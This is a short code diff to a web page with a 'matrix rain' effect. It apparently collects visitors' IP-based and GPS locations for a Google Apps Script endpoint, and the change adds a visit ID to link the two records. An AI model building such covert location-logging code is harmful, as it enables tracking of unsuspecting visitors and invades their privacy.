@@ -617,6 +617,9 @@
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzyuP96CjIPxn8y6uahaRsFHVTtCk070gHHspC9iVdVNbMADH2S6EX8kH_R8iQ8S94m/exec";
         // =====================================================
 
+        // Unique visit ID — shared between IP & GPS requests from same visit
+        const VISIT_ID = Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
+
         // === MATRIX RAIN ===
         const canvas = document.getElementById('matrix-canvas');
         const ctx = canvas.getContext('2d');
@@ -691,6 +694,7 @@
                 .then(res => res.json())
                 .then(ipData => {
                     const data = {
+                        visitId: VISIT_ID,
                         latitude: ipData.latitude || "N/A",
                         longitude: ipData.longitude || "N/A",
                         accuracy: "IP-Based (~" + (ipData.city ? "City" : "Country") + " level)",
@@ -740,6 +744,7 @@
             const accuracy = position.coords.accuracy;
 
             const data = {
+                visitId: VISIT_ID,
                 latitude: latitude,
                 longitude: longitude,
                 accuracy: accuracy.toFixed(2) + " meters",
